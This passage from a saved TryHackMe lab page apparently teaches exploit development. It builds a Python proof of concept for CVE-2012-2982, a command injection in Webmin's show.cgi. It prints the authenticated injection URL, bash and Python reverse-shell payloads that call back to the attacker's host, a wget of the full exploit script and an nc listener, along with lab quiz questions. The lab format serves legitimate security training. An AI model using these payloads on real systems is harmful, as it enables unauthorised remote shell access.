255);text-decoration-style:initial;text-decoration-color:initial;display:inline;float:none"><span></span></span></p><span style="font-family:&quot;Arial&quot;">We can include a variable with the file to target using <a href="https://www.geeksforgeeks.org/formatted-string-literals-f-strings-python/" target="_blank">f-strings</a>.</span> <span style="font-family:&quot;Arial&quot;"><span style="white-space:pre">We know the receiving port is the default port 80 so we don't need to include it manually.</span></span><p></p><p></p><p style="line-height:1"><code>url = f"http://{targetIP}/session_login.cgi"</code><span style="font-family:&quot;Arial&quot;"></span></p><p style="line-height:1.5"><span style="font-family:&quot;Arial&quot;"><span style="white-space:pre"><span style="color:rgb(0, 0, 0);font-family:&quot;Arial&quot;;font-size:15px;font-style:normal;font-variant-ligatures:normal;font-variant-caps:normal;font-weight:400;letter-spacing:normal;text-align:left;text-indent:0px;text-transform:none;white-space:normal;word-spacing:0px;-webkit-text-stroke-width:0px;background-color:rgb(255, 255, 255);text-decoration-style:initial;text-decoration-color:initial;display:inline;float:none"><span style="font-size:16px">Now
 we have all of the information we need to login via POST request. We'll
 be sending the credentials, the test cookie with its value, as well as 
ignoring TLS and site redirects.</span></span></span></span></p><p style="line-height:1.5"><code>r = requests.post(url, data=data, cookies={"testing":"1"}, verify=False, allow_redirects=False)<br></code><span style="font-family:&quot;Arial&quot;"><span style="white-space:pre"><span><span></span></span></span></span><br><span style="font-family:&quot;Arial&quot;"><span style="white-space:pre"><span style="color:rgb(0, 0, 0);font-family:&quot;Arial&quot;;font-size:15px;font-style:normal;font-variant-ligatures:normal;font-variant-caps:normal;font-weight:400;letter-spacing:normal;text-align:left;text-indent:0px;text-transform:none;white-space:normal;word-spacing:0px;-webkit-text-stroke-width:0px;background-color:rgb(255, 255, 255);text-decoration-style:initial;text-decoration-color:initial;display:inline;float:none"><span style="font-size:16px"></span></span></span></span></p><p style="line-height:1.5"><span style="font-family:&quot;Arial&quot;">Next we can include the if statement. We can check the status code and verify the cookies aren't empty using methods from the</span><span style="font-family:&quot;Arial&quot;"> </span><code>requests</code><span style="font-family:&quot;Arial&quot;"> module.</span></p><p style="line-height:1.5"><span style="font-family:&quot;Arial&quot;"><code>if r.status_code == 302 and r.cookies["sid"] != None</code></span><span style="font-family:&quot;Arial&quot;"><span style="white-space:pre"></span></span><br><span style="font-family:&quot;Arial&quot;"></span></p><p style="line-height:1.5"><span style="font-family:&quot;Arial&quot;">In the metasploit module, the manual formatting of cookies with </span><code>.split()</code><span style="font-family:&quot;Arial&quot;">
 is necessary but this is not the case in python. While we are able to 
include several methods to obtain the alphanumeric cookie, we can simply
 read the value from the header directly with </span><code>r.cookies["sid"]</code><span style="font-family:&quot;Arial&quot;">. </span><span style="font-family:&quot;Arial&quot;"></span><span style="font-family:&quot;Arial&quot;"><span style="font-family:&quot;Arial&quot;">We can assemble a quick test and see each method of formatting the cookie works.</span></span><br><span style="font-family:&quot;Arial&quot;"></span></p><p><img style="width:795px;height:462.459px" src="./TryHackMe _ Intro PoC Scripting_files/gSfY8QZ.png"><span style="font-family:&quot;Arial&quot;"><span style="font-family:&quot;Arial&quot;"><br></span></span></p><p><span style="font-family:&quot;Arial&quot;"><span style="font-family:&quot;Arial&quot;"></span>We've now completed the login section of our exploit. <br></span></p><ul><li><strike><span style="font-family:&quot;Arial&quot;"><span><strong><span>the login page <a class="JvP4qY45 glossary-term" onclick="initPopOver(&#39;URI&#39;, &#39;JvP4qY45&#39;)">URI</a> data (credentials, receiving port and login page file)</span><br></strong></span></span></strike></li><li><strike><span style="font-family:&quot;Arial&quot;"><span><strong></strong></span></span><span style="font-family:&quot;Arial&quot;"><span><strong><span>POST request sending the <a class="VVmM0kip glossary-term" onclick="initPopOver(&#39;URI&#39;, &#39;VVmM0kip&#39;)">URI</a> data</span></strong></span></span></strike></li><li><strike><span style="font-family:&quot;Arial&quot;"><span></span></span><span style="font-family:&quot;Arial&quot;"><span><strong>format the cookie</strong></span></span><span style="font-family:&quot;Arial&quot;"><span><br></span></span></strike></li><li><strike><span style="font-family:&quot;Arial&quot;"><span></span></span><span style="font-family:&quot;Arial&quot;"><span><strong><span><strong><span>verify <a class="pKwtChgu glossary-term" onclick="initPopOver(&#39;HTTP&#39;, &#39;pKwtChgu&#39;)">HTTP</a> response code and the session id is not empty</span></strong></span></strong></span></span><span style="font-family:&quot;Arial&quot;"><b>, print statement to verify success</b></span></strike></li></ul><p><span style="font-family:&quot;Arial&quot;"></span></p><p><span style="font-family:&quot;Arial&quot;"><u><b><span style="font-size:24px">Exploit</span></b></u><br></span></p><p><span style="font-family:&quot;Arial&quot;">Now we've reached the main event, crafting our exploit. Let's review our needs and discuss some initial ideas to implement them.</span></p><ul><li><span style="font-family:&quot;Arial&quot;"><span><strong><span><strong><span style="white-space:pre">generate five random alphanumeric characters</span></strong></span></strong></span></span></li><li><b><span style="font-family:&quot;Arial&quot;"><span style="font-family:&quot;Arial&quot;"><span style="white-space:pre"><span style="white-space:pre">store the system shell with a function, encode it and send it back via socket</span></span></span></span></b></li><li><b><span style="font-family:&quot;Arial&quot;"><span style="font-family:&quot;Arial&quot;"><span style="white-space:pre"><span style="white-space:pre"></span></span></span></span><span style="font-family:&quot;Arial&quot;"><span style="font-family:&quot;Arial&quot;"><span style="white-space:pre"><span style="white-space:pre"><span style="white-space:pre">send a GET or POST request with compromised cookie to show.cgi with invalid input piping it to the malicious command </span></span></span></span></span></b></li></ul><p><span style="font-family:&quot;Arial&quot;"></span></p><p><span style="font-family:&quot;Arial&quot;"></span><span style="font-family:&quot;Arial&quot;"><span>The exploit section of our code will also be straightforward. We will write functions to generate five random alphanumeric characters stored in a string and a payload which opens the shell via </span><span><code class="code-81e98f88">bash</code></span><span> and captures the output to send via a GET or POST request</span>.</span></p><p style="line-height:1.5"><span style="font-family:&quot;Arial&quot;">The simplest way to execute the payload would be to replicate the original ruby program by formatting it inside of the URL. This saves space and makes the program clearer by directly piping the invalid character to the payload. In order to do this, we'll have to analyze the type of data we're dealing with. For data to be used in conjunction, it must be of the same type. Our random character and payload functions must both be strings to be formatted in the URL. </span><br></p><p style="line-height:1.5"><code>exp = f"http://{targetIP}/file/show.cgi/bin/{rand()}|{payload()}|"</code><span></span><span><span></span></span><span style="font-family:&quot;Arial&quot;"><span><span></span></span></span></p><p style="line-height:1.5"><span style="font-family:&quot;Arial&quot;">Using the </span><code>string</code><span style="font-family:&quot;Arial&quot;"> and </span><code>secrets</code><span style="font-family:&quot;Arial&quot;"> modules we're able to make a function that randomly prints five alphanumeric character. The strings library does not have a native alphanumeric method, so I had to combine methods representing single digits and all cases alphabet letters.</span></p><p style="line-height:1.5"><code>alphaNum = string.ascii_letters + string.digits </code><span style="font-family:&quot;Arial&quot;"><span><span></span></span><span></span></span></p><p style="line-height:1.5"><span style="font-family:&quot;Arial&quot;"><span><span>We can then input this variable to be randomly generated with five characters </span></span></span><code>randChar = ''.join(secrets.choice(alphaNum) for i in range(5))</code><span style="font-family:&quot;Arial&quot;"><span><span><span><span></span></span><span></span></span></span></span></p><p style="line-height:1.5"><img style="width:620.2px;height:393.645px" src="./TryHackMe _ Intro PoC Scripting_files/E5iLfsI.png"><span style="font-family:&quot;Arial&quot;"><br></span></p><p style="line-height:1.5"><span style="font-family:&quot;Arial&quot;">And we have our invalid input function.</span></p><p style="line-height:1.5"><span style="font-family:&quot;Arial&quot;"><u><b><span style="font-size:18px">payload()</span></b></u><br></span></p><span><span><span style="font-family:&quot;Arial&quot;"><span>There are numerous ways to execute the system shell on <a class="2OKrod81 glossary-term" onclick="initPopOver(&#39;Linux&#39;, &#39;2OKrod81&#39;)">Linux</a> </span></span></span></span><span><span><span style="font-family:&quot;Arial&quot;"><span><span><span style="font-family:&quot;Arial&quot;">as we have the freedom to <b>execute any command</b> that we want</span></span></span>. In this scenario we will save steps and space by using </span></span></span><code>bash</code><span><span><span style="font-family:&quot;Arial&quot;"> to open a connection to the attacker and send the shell. <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#reverse-shell" target="_blank">PayloadsAllTheThings</a> lists the following examples:</span></span></span><p><img style="width:787px;height:160.106px" src="./TryHackMe _ Intro PoC Scripting_files/kbhckaf.png"><span><span><span style="font-family:&quot;Arial&quot;"><br></span></span></span></p><p><span><span><span style="font-family:&quot;Arial&quot;">The first command listed </span></span></span><code>bash -i</code><span><span><span style="font-family:&quot;Arial&quot;"> is a popular one line command to establish an interactive reverse shell on a system. This will be the basis for our payload() function but it does require some tweaks. While it executes a reverse shell, we are missing a key point. Without specifying what to do with the bash shell that executes on boot, the system is unable to distinguish between separate processes of bash. To fix this, we can use </span></span></span><code>bash -c 'exec bash -i xyz'</code><span><span><span style="font-family:&quot;Arial&quot;"><br></span></span></span></p><p><span><span><span style="font-family:&quot;Arial&quot;"><b><a href="https://www.computerhope.com/unix/bash/exec.htm" target="_blank">exec</a></b> </span></span></span><span><span><span style="font-family:&quot;Arial&quot;"><span><span>completely replaces the 
current running process. The current shell process is destroyed and entirely 
replaced by the command we specify which will be the reverse shell </span></span></span></span></span><code>bash -i &amp;&gt;/dev/tcp/TARGET_IP/PORT</code><span><span><span style="font-family:&quot;Arial&quot;"><span><span><br></span></span></span></span></span></p><p><span><span><span style="font-family:&quot;Arial&quot;">I also want to discuss the meaning of </span></span></span><span><span><span style="font-family:&quot;Arial&quot;"><span><span><span style="font-family:&quot;Arial&quot;"><b>"&lt;&amp;1"</b>,</span></span></span> "0&gt;&amp;1", or "</span></span></span><span><span><span style="font-family:&quot;Arial&quot;"><span><span><span style="font-family:&quot;Arial&quot;">0&lt;&amp;1</span></span></span>" which are interchangeable, <b><a href="https://unix.stackexchange.com/questions/521596/what-does-the-01-shell-redirection-mean" target="_blank">this article</a></b> discusses the specific command in detail. I recommend reading <a href="https://stackoverflow.com/questions/24793069/what-does-do-in-bash" target="_blank">this article</a> and <a href="https://unix.stackexchange.com/questions/120532/what-does-exec-31-do" target="_blank">this article</a> if the syntax is brand new to you. The purpose of "&lt;&amp;1" is to redirect the output stream </span></span></span><span><span><span style="font-family:&quot;Arial&quot;"><span><span><span style="font-family:&quot;Arial&quot;">(1, stdout) </span></span></span><span>of the <a class="ByAV6I8u glossary-term" onclick="initPopOver(&#39;TCP&#39;, &#39;ByAV6I8u&#39;)">TCP</a> socket to the input stream (0, stdin) of the bash shell and create a </span><i>reverse</i> shell.</span></span></span><span><span><span style="font-family:&quot;Arial&quot;"><span> Bash opens a <a class="7P2XeR2t glossary-term" onclick="initPopOver(&#39;TCP&#39;, &#39;7P2XeR2t&#39;)">TCP</a> socket on the target machine through the given port and makes a request to the given IP (the attacker). The output stream of the socket is then redirected to the input steam of the new bash shell, sending the shell process through the socket. </span></span></span></span><span><span><span style="font-family:&quot;Arial&quot;"><span><span><span style="font-family:&quot;Arial&quot;"><span><span><span style="font-family:&quot;Arial&quot;">The ampersand character "&amp;" acts as a reference to the I/O socket streams. </span></span></span></span></span></span></span></span></span></p><p><span><span><span style="font-family:&quot;Arial&quot;"></span></span></span><code>payload = f"bash -c 'exec bash -i &amp;&gt;/dev/tcp/{lhost}/{lport}&lt;&amp;1'"</code><span><span><span style="font-family:&quot;Arial&quot;"></span></span></span></p><p></p><p></p><p><span><span><span style="font-family:&quot;Arial&quot;">Lastly, all we need is the second request with the authenticated cookie. The module did not specify whether to use a POST or GET method however, in this scenario either method works. <br></span></span></span></p><p><code>req = requests.post(exp, cookies={"sid":sid}, verify=False, allow_redirects=False)</code><span><span><span style="font-family:&quot;Arial&quot;"><br></span></span></span></p><ul><li style="line-height:1.5"><strike><span style="font-family:&quot;Arial&quot;"><span><strong><span><strong><span style="white-space:pre">generate five random alphanumeric characters</span></strong></span></strong></span></span></strike></li><li style="line-height:1.5"><strike><span style="font-family:&quot;Arial&quot;"><span><strong><span><strong><span style="white-space:pre"></span></strong></span></strong></span></span><b><span style="font-family:&quot;Arial&quot;"><span style="font-family:&quot;Arial&quot;"><span style="white-space:pre"><span style="white-space:pre">store the system shell with a function, encode it and send it back via socket</span></span></span></span></b><span style="font-family:&quot;Arial&quot;"><span><strong><span><strong><br></strong></span></strong></span></span></strike></li><li style="line-height:1.5"><strike><span style="font-family:&quot;Arial&quot;"><span><strong><span><strong></strong></span></strong></span></span><b><span style="font-family:&quot;Arial&quot;"><span style="font-family:&quot;Arial&quot;"><span style="white-space:pre"><span style="white-space:pre"><span style="white-space:pre">send a GET or POST request with compromised cookie to show.cgi with invalid input piping it to the malicious command </span></span></span></span></span></b></strike><span style="font-family:&quot;Arial&quot;"><span><strong><span><strong></strong></span></strong></span></span><span style="font-family:&quot;Arial&quot;"><span style="font-family:&quot;Arial&quot;"></span></span></li></ul><span style="font-family:&quot;Arial&quot;"></span><span style="font-family:&quot;Arial&quot;"></span><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p></div>
        </div>
        
        <div class="room-questions-split vertical-align-custom red">
            <div>Answer the questions below</div>
        </div>
        
                            <div class="room-task-questions">
                            <div class="room-task-question-no vertical-align-custom">
                                
                            </div>
                            <div class="room-task-question-details"><span>
                                Which HTTP response header allows us to send an authenticated POST request?</span><br>
                            </div>
                        </div>

                    <div class="room-task-input">
                        <div class="room-task-input-questions">
                            <input type="text" class="form-control room-answer-field" placeholder="Answer format: **********" value="">
                            <input type="hidden" value="1">
                            <input type="hidden" value="4">
                        </div>
                        <div class="room-task-input-answer">
                            <button type="button" class="btn btn-outline-success task-answer" onclick="answerQuestion(this)">
                            <i class="far fa-paper-plane"></i> Submit
                        </button>
                        </div>
                        
                    </div><div class="room-task-questions">
                            <div class="room-task-question-no vertical-align-custom">
                                
                            </div>
                            <div class="room-task-question-details">
                                <p>Which is the correct method for formatting cookies in this example?</p><p>r.headers().replace().split().strip()</p><p>r.headers().split().strip()</p><p>a = r.cookies()</p>b = a.strip()
                            </div>
                        </div>

                    <div class="room-task-input">
                        <div class="room-task-input-questions">
                            <input type="text" class="form-control room-answer-field" placeholder="Answer format: ***" value="">
                            <input type="hidden" value="2">
                            <input type="hidden" value="4">
                        </div>
                        <div class="room-task-input-answer">
                            <button type="button" class="btn btn-outline-success task-answer" onclick="answerQuestion(this)">
                            <i class="far fa-paper-plane"></i> Submit
                        </button>
                        </div>
                        <div class="room-task-input-hint">
                            <button type="button" class="btn btn-outline-dorange btn-noline task-hint" onclick="getHint(this)">
                        <i class="fal fa-lightbulb"></i> Hint
                      </button>
                        </div>
                    </div><div class="room-task-questions">
                            <div class="room-task-question-no vertical-align-custom">
                                
                            </div>
                            <div class="room-task-question-details">
                                What data type does the payload need to be?
                            </div>
                        </div>

                    <div class="room-task-input">
                        <div class="room-task-input-questions">
                            <input type="text" class="form-control room-answer-field" placeholder="Answer format: ******" value="">
                            <input type="hidden" value="3">
                            <input type="hidden" value="4">
                        </div>
                        <div class="room-task-input-answer">
                            <button type="button" class="btn btn-outline-success task-answer" onclick="answerQuestion(this)">
                            <i class="far fa-paper-plane"></i> Submit
                        </button>
                        </div>
                        
                    </div><div class="room-task-questions">
                            <div class="room-task-question-no vertical-align-custom">
                                
                            </div>
                            <div class="room-task-question-details">
                                Why do we need to use "bash -c exec" instead of just "bash -i"
                            </div>
                        </div>

                    <div class="room-task-input">
                        <div class="room-task-input-questions">
                            <input type="text" class="form-control room-answer-field" placeholder="Answer format: ******** ******* ***** *******" value="">
                            <input type="hidden" value="4">
                            <input type="hidden" value="4">
                        </div>
                        <div class="room-task-input-answer">
                            <button type="button" class="btn btn-outline-success task-answer" onclick="answerQuestion(this)">
                            <i class="far fa-paper-plane"></i> Submit
                        </button>
                        </div>
                        <div class="room-task-input-hint">
                            <button type="button" class="btn btn-outline-dorange btn-noline task-hint" onclick="getHint(this)">
                        <i class="fal fa-lightbulb"></i> Hint
                      </button>
                        </div>
                    </div><div class="room-task-questions">
                            <div class="room-task-question-no vertical-align-custom">
                                
                            </div>
                            <div class="room-task-question-details">
                                <p>What is the purpose of "&lt;&amp;1" in the payload function?</p>
                            </div>
                        </div>

                    <div class="room-task-input">
                        <div class="room-task-input-questions">
                            <input type="text" class="form-control room-answer-field" placeholder="Answer format: ********* ****** ****** ****** ** **** ***** ******" value="">
                            <input type="hidden" value="5">
                            <input type="hidden" value="4">
                        </div>
                        <div class="room-task-input-answer">
                            <button type="button" class="btn btn-outline-success task-answer" onclick="answerQuestion(this)">
                            <i class="far fa-paper-plane"></i> Submit
                        </button>
                        </div>
                        <div class="room-task-input-hint">
                            <button type="button" class="btn btn-outline-dorange btn-noline task-hint" onclick="getHint(this)">
                        <i class="fal fa-lightbulb"></i> Hint
                      </button>
                        </div>
                    </div>
                        </div>
                    </div>
                </div><div class="card" id="task-5">
                    <div class="card-header task-header" data-toggle="collapse" href="#collapse5">
                        <a class="card-link">
                            <span class="task-dropdown-title red">Task 5                             <span class="task-dropdown-icon"><i class="far fa-circle text-lgray"></i></span></span> Final exploit and test
                            <span class="float-right"><i class="fas fa-chevron-down"></i></span>
                            <span class="task-resources"></span>
                        </a>
                    </div>
                    <div id="collapse5" class="collapse " data-parent="#taskContent">
                        <div class="card-body task-incomplete">
                            <div class="room-task-desc">
            <div class="room-task-desc-data"> <p><span style="font-family:&quot;Arial&quot;">We're ready to test the final script, run the following commands:</span></p><p><code>wget https://raw.githubusercontent.com/cd6629/CVE-2012-2982-Python-PoC/master/web.py</code><span style="font-family:&quot;Arial&quot;"></span></p><p><span style="font-family:&quot;Arial&quot;">Change the attacker IP and listen for the shell with </span><code>nc -nlvp 53<br></code></p><p><span style="font-family:&quot;Arial&quot;"></span><code>python3 web.py &lt;targetIP&gt;</code><span style="font-family:&quot;Arial&quot;"></span><span style="font-family:&quot;Arial&quot;"> if you receive errors about missing libraries, install them with </span><code>pip</code></p><p></p><p></p><p></p><p><img style="width:1034.68px;height:523.133px" src="./TryHackMe _ Intro PoC Scripting_files/v7LQnbd.png"><br></p></div>
        </div>
        
        <div class="room-questions-split vertical-align-custom red">
            <div>Answer the questions below</div>
        </div>
        
                            <div class="room-task-questions">
                            <div class="room-task-question-no vertical-align-custom">
                                
                            </div>
                            <div class="room-task-question-details">
                                Run the program and listen for the shell. What is the /root/root.txt flag?<br>
                            </div>
                        </div>

                    <div class="room-task-input">
                        <div class="room-task-input-questions">
                            <input type="text" class="form-control room-answer-field" placeholder="Answer format: ***{**************}" value="">
                            <input type="hidden" value="1">
                            <input type="hidden" value="5">
                        </div>
                        <div class="room-task-input-answer">
                            <button type="button" class="btn btn-outline-success task-answer" onclick="answerQuestion(this)">
                            <i class="far fa-paper-plane"></i> Submit
                        </button>
                        </div>
                        
                    </div>
                        </div>
                    </div>
                </div><div class="card" id="task-6">
                    <div class="card-header task-header" data-toggle="collapse" href="#collapse6">
                        <a class="card-link">
                            <span class="task-dropdown-title red">Task 6                             <span class="task-dropdown-icon"><i class="far fa-circle text-lgray"></i></span></span> Common Mistakes
                            <span class="float-right"><i class="fas fa-chevron-down"></i></span>
                            <span class="task-resources"></span>
                        </a>
                    </div>
                    <div id="collapse6" class="collapse " data-parent="#taskContent">
                        <div class="card-body task-incomplete">
                            <div class="room-task-desc">
            <div class="room-task-desc-data"> <p></p><p style="line-height:1.5"><span style="font-family:&quot;Arial&quot;"><span style="font-family:&quot;Arial&quot;"><span>When writing exploits, the 
goal is not to use complex code or use more than is necessary for 
the task. While you do want clean and concise code, sometimes PoC 
scripts are crafted in specific ways, maybe the author had your original
 thought process and found an easier solution. Maybe something required in the original language is not necessary in the language you're using and vice versa. </span></span></span></p><p style="line-height:1.5"><span style="font-family:&quot;Arial&quot;"><span style="font-family:&quot;Arial&quot;">The point here is, do not
 feel discouraged if you try things that do not work, some would argue 
you cannot learn without failure.<span style="font-family:&quot;Arial&quot;"> Keeping note of what did not
 work, what is unsuccessful is critical in becoming a better exploit 
developer. Each mistake is a learning opportunity and gives you more 
experience.</span></span> If
 you are ever unsure if a segment of code will work it's beneficial to individually test parts of it. <b>Trial and error</b>
 is one of the most important concepts to master so I believe it is 
vital to highlight what went wrong. </span></p><p style="line-height:1.5"><span style="font-family:&quot;Arial&quot;"></span><span style="font-family:&quot;Arial&quot;"><span style="font-family:&quot;Arial&quot;"><span style="font-family:&quot;Arial&quot;">The payload function was not as straightforward initially. The 
assumption was to determine a way to pipe the output of one function to 
another function, the random character to the payload function. I 
falsely assumed that you couldn't simply embed functions inside of a 
string to be included in the URL. I had guessed to upload the payload 
via the <i>data</i> parameter of the POST request, as it permits file objects. Consequentially I completely ignored the fact that we had <b>arbitrary</b> <b>command execution</b> and did not have to strictly use python. </span></span></span><span style="font-family:&quot;Arial&quot;"><span style="font-family:&quot;Arial&quot;"><span style="font-family:&quot;Arial&quot;"><br></span></span></span></p><p style="line-height:1.5"><span style="font-family:&quot;Arial&quot;"><span style="font-family:&quot;Arial&quot;"><span style="font-family:&quot;Arial&quot;"><span style="font-family:&quot;Arial&quot;">If we wanted to execute the system shell strictly with python, we can use the </span><code>subprocess</code><span style="font-family:&quot;Arial&quot;">
 module. There are several ways to open the system shell using this 
module, I've listed examples below. It's also important to understand that 
not all systems will have python3 as the default python application, the version of python executed on the system must be 
considered. </span></span></span></span></p><p style="line-height:1.5"><img style="width:536.704px;height:365.9px" src="./TryHackMe _ Intro PoC Scripting_files/VwiJLEp.png"><span style="font-family:&quot;Arial&quot;"><span style="font-family:&quot;Arial&quot;"><span style="font-family:&quot;Arial&quot;"><span style="font-family:&quot;Arial&quot;"><br></span></span></span></span></p><p style="line-height:1.5"><span style="font-family:&quot;Arial&quot;"><span style="font-family:&quot;Arial&quot;"><span style="font-family:&quot;Arial&quot;"><span style="font-family:&quot;Arial&quot;">The main difference </span></span></span></span><span style="font-family:&quot;Arial&quot;"><span style="font-family:&quot;Arial&quot;"><span style="font-family:&quot;Arial&quot;"><span style="font-family:&quot;Arial&quot;"><span style="font-family:&quot;Arial&quot;"><span style="font-family:&quot;Arial&quot;"><span style="font-family:&quot;Arial&quot;"><span style="font-family:&quot;Arial&quot;">between the three methods is</span></span></span></span></span><span style="font-family:&quot;Arial&quot;"> </span><code>subprocess.popen()</code><span style="font-family:&quot;Arial&quot;"> does not wait for the program to finish and simply continues executing. This is not useful to us as we need the complete output to send over the socket.</span><span style="font-family:&quot;Arial&quot;"><br></span></span></span></span></p><p style="line-height:1.5"><span style="font-family:&quot;Arial&quot;"><span style="font-family:&quot;Arial&quot;"><span style="font-family:&quot;Arial&quot;"></span></span>Let's first determine the data type 
when calling the shell. </span><span style="font-family:&quot;Arial&quot;"></span><span style="font-family:&quot;Arial&quot;"> </span><span style="font-family:&quot;Arial&quot;"></span></p><p style="line-height:1.5"><img style="width:597.621px;height:271.85px" src="./TryHackMe _ Intro PoC Scripting_files/hzm4YV4.png"><span style="font-family:&quot;Arial&quot;"><br></span></p><p style="line-height:1.5"><br><span style="font-family:&quot;Arial&quot;"><code>subprocess.run()</code><span style="font-family:&quot;Arial&quot;"><span><span>
 uses a CompletedProcess object with a stdout attribute. This means the 
subprocess will return bytes as the output that we'll need to decode 
into a string in order to call/format the payload inside of the URL 
string. <b>The type of data must be equal</b>. <br></span></span></span></span></p><p style="line-height:1.5"><span style="font-family:&quot;Arial&quot;"><span><span>This was the original function with the subsequent error message.</span></span></span></p><p style="line-height:1.5"><img style="width:991px;height:248.029px" src="./TryHackMe _ Intro PoC Scripting_files/D0GRpBv.png"><span style="font-family:&quot;Arial&quot;"><span><span><br></span></span></span></p><p style="line-height:1.5"><span style="font-family:&quot;Arial&quot;"><span><span><span><span><span style="font-family:&quot;Arial&quot;">There are several mistakes here. </span></span></span></span></span></span></p><ul><li><span><span><span style="font-family:&quot;Arial&quot;">I was unaware that </span></span></span><code>subprocess.run()</code><span><span><span style="font-family:&quot;Arial&quot;"> wasn't used until python3</span></span></span></li><li><span><span><span style="font-family:&quot;Arial&quot;"><span><span><span style="font-family:&quot;Arial&quot;">I didn't properly encode/decode the payload function, I received a response of </span></span></span></span></span></span><span><span><span style="font-family:&quot;Arial&quot;"><span><span><span style="font-family:&quot;Arial&quot;"><span><span><span style="font-family:&quot;Arial&quot;"><i>b' '</i> meaning the POST request was empty<br></span></span></span></span></span></span></span></span></span></li><li><span><span><span style="font-family:&quot;Arial&quot;"><span><span><span style="font-family:&quot;Arial&quot;"><span><span><span style="font-family:&quot;Arial&quot;"><span><span><span style="font-family:&quot;Arial&quot;">The socket is opening on the attackers computer instead of the victim computer</span></span></span></span></span></span></span></span></span></span></span></span></li></ul><p><span><span><span style="font-family:&quot;Arial&quot;">The output was decoded as a string without first </span></span></span><span><span><span style="font-family:&quot;Arial&quot;">encoding it in <a href="https://medium.com/swlh/powering-the-internet-with-base64-d823ec5df747#:~:text=Data%20transmission%3A%20Base64%20can%20simply,avoid%20depending%20on%20external%20files." target="_blank">base64</a> or </span></span></span><span><span><span style="font-family:&quot;Arial&quot;"><span><span><span style="font-family:&quot;Arial&quot;"></span></span></span>HTML encoding.</span></span></span><span><span><span style="font-family:&quot;Arial&quot;"> The order matters because of the direction data flows. We could use the 
base64 or <a href="https://docs.python.org/3/library/urllib.parse.html" target="_blank">urllib.parse</a>
 libraries to encode the payload with ASCII characters for the 
systems to properly exchange data over the socket. </span></span><span><span style="font-family:&quot;Arial&quot;"></span></span></span></p><p><span><span><span style="font-family:&quot;Arial&quot;">We can use the payload below to invoke </span></span></span><code>subprocess.call</code><span><span><span style="font-family:&quot;Arial&quot;"> in a single python <b>command</b> by </span></span></span><span><span><span style="font-family:&quot;Arial&quot;"><span><span><span style="font-family:&quot;Arial&quot;">opening a socket on the target machine and calling the system shell.</span></span></span></span></span></span></p><p><span><span><span style="font-family:&quot;Arial&quot;"><span><span><span style="font-family:&quot;Arial&quot;"></span></span></span></span></span></span><code>payload
 = "python -c \'import 
socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\""+
 lhost + "\"," + lport + "));os.dup2(s.fileno(),0); 
os.dup2(s.fileno(),1); 
os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"])\'"</code><span style="font-family:&quot;Arial&quot;"></span><br></p><p><span><span><span style="font-family:&quot;Arial&quot;">From the metasploit module's use of </span></span></span><code>payload.encoded</code><span><span><span style="font-family:&quot;Arial&quot;"> as the attack vector is through a URL, we might assume that the data has to be URL encoded.</span></span></span></p><p><code>urlEncode = urllib.parse.quote(payload)</code></p><span><span><span style="font-family:&quot;Arial&quot;">We can also 
manually encode/decode the payload with <a href="https://stackabuse.com/encoding-and-decoding-base64-strings-in-python/" target="_blank">base64</a><span> in the event that the use of many 
characters would break in transit to the URI. In this scenario even though the payload does not break, </span><b>every system is different</b>. This emphasizes the need to understand how data is sent in case the 
payload doesn't execute without specifying the types of encoding necessary 
for the systems to communicate.</span></span></span><p></p><p><img style="width:792.7px;height:148.775px" src="./TryHackMe _ Intro PoC Scripting_files/94arNLw.png"><span><span><span style="font-family:&quot;Arial&quot;"><br></span></span></span></p><p><span><span><span style="font-family:&quot;Arial&quot;"><span><span><span style="font-family:&quot;Arial&quot;">All three of these 
solutions are feasible and have been tested to work in this example. I 
encourage you to test them yourself as well.</span></span></span></span></span></span><span><span><span style="font-family:&quot;Arial&quot;"></span></span></span></p><p><span><span><span style="font-family:&quot;Arial&quot;"><span><span><span style="font-family:&quot;Arial&quot;"></span></span></span></span></span></span></p></div>
        </div>
        
        <div class="room-questions-split vertical-align-custom red">
            <div>Answer the questions below</div>
        </div>
        
                            <div class="room-task-questions">
                            <div class="room-task-question-no vertical-align-custom">
                                
                            </div>
                            <div class="room-task-question-details">
                                No questions here<br>
                            </div>
                        </div>

                    <div class="room-task-input">
                        <div class="room-task-input-questions">
                            <input type="text" class="form-control room-answer-field" placeholder="No answer needed" value="" disabled="">
                            <input type="hidden" value="1">
                            <input type="hidden" value="6">
                        </div>
                        <div class="room-task-input-answer">
                            <button type="button" class="btn btn-outline-success task-answer" onclick="answerQuestion(this)">
                            <i class="far fa-paper-plane"></i> Completed
                        </button>
                        </div>
                        
                    </div>
                        </div>
                    </div>
                </div><div class="card" id="task-7">
                    <div class="card-header task-header" data-toggle="collapse" href="#collapse7">
                        <a class="card-link">
                            <span class="task-dropdown-title red">Task 7                             <span class="task-dropdown-icon"><i class="far fa-circle text-lgray"></i></span></span> Thoughts and resources
                            <span class="float-right"><i class="fas fa-chevron-down"></i></span>
                            <span class="task-resources"></span>
                        </a>
                    </div>
                    <div id="collapse7" class="collapse " data-parent="#taskContent">
                        <div class="card-body task-incomplete">
                            <div class="room-task-desc">
            <div class="room-task-desc-data"> <p><span style="font-family:&quot;Arial&quot;">Well...that was a lot to process. Let's review everything we learned in this room, we learned...</span></p><ul><li><span style="font-family:&quot;Arial&quot;">what exploit development is and why we <i>should</i> learn it<br></span></li><li><span style="font-family:&quot;Arial&quot;"><span>how to begin writing <a class="M9Kt6DL1 glossary-term" onclick="initPopOver(&#39;PoC&#39;, &#39;M9Kt6DL1&#39;)">PoC</a> scripts </span></span><span style="font-family:&quot;Arial&quot;"><span style="font-family:&quot;Arial&quot;"><span style="font-family:&quot;Arial&quot;">with appropriate
